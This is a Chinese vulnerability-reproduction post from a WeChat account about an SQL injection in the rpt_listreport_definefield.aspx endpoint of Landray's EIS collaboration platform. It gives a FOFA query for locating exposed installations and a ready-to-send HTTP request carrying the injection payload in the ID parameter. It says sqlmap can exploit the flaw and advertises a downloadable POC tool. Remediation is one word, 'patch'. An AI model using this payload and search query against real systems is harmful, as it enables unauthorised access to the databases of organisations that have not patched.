#  蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-03-03 23:12  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 蓝凌EIS智慧协同平台简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
蓝凌智慧协同平台eis集合了非常丰富的模块，满足组织企业在知识、协同、项目管理系统建设等需求  
## 2.漏洞描述  
  
蓝凌智慧协同平台eis集合了非常丰富的模块，满足组织企业在知识、协同、项目管理系统建设等需求。蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
蓝凌EIS智慧协同平台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGEsmwakaCCynPnzPz6JGuv9Mowia0QkLBPznAnaaiaGoPVSKEY2UCiadtuQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
icon_hash="953405444"||app="Landray-OA系统"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+  
  
漏洞数据包：  
```
GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGElu6FtO0IOMRzcMiaoScAicxX5gtmDFkrrbjI5SKajL6zsJF3T657kiaUA/640?wx_fmt=jpeg&from=appmsg "null")  
  
可以用SQLmap跑出来  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGE4k4H4HZlUz0ziblrJvT0QZmE0UicgPdD4RD4oIpR5pe4OBXf5JUwMO5w/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现107 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGEniaicsjtBibtsYKiaMPR155JAmFg66sSeCjtW8qWgP2fCUicpYsOmgY0Yxg/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGEaiacQZGDazKwDyaGzNMTLo4znmu3SqiaMbYFcmSJAMRZMJBwN74CQ9MQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGEMmiapzDRQgLDBtttG4nEHIoXTp6a4RmVb5E9TtXJyRfJzbqdSzzkmKw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGElWIqU1tz89Dyia0Dkum1rE9HhaYyHHx5ENCqNgnf9EjFWliaOMy7vvKw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGEicibMXdsV8QCp44UibCEn6Jv711viaR5cSwbrWpsn0VYlPcFqs8ulhzfrQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aVgSibmxODlezyKtib99LIGErRD8ZcD45iapmOUCicaMw51deNeD2XLmbSKExRtfJDiayqQs7VxT0H1icA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[华天动力OA8000办公系统ntkodownload.jsp存在任意文件读取漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485455&idx=1&sn=17e77b101b7c0617f0cc9aa550747933&chksm=974b8508a03c0c1e8af01d12149948af4af69eb8ca1078333778364ef9a2e9c4d79769ca3d23&scene=21#wechat_redirect)  
  
  
[蓝凌OA wechatLoginHelper存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485442&idx=1&sn=1dd5f1210b7a66a5852bde27aafdbc1e&chksm=974b8505a03c0c131fe130c035de9c37e9c0bf9c52a284ed05a8b278aa02514be174f3d40464&scene=21#wechat_redirect)  
  
  
  
  
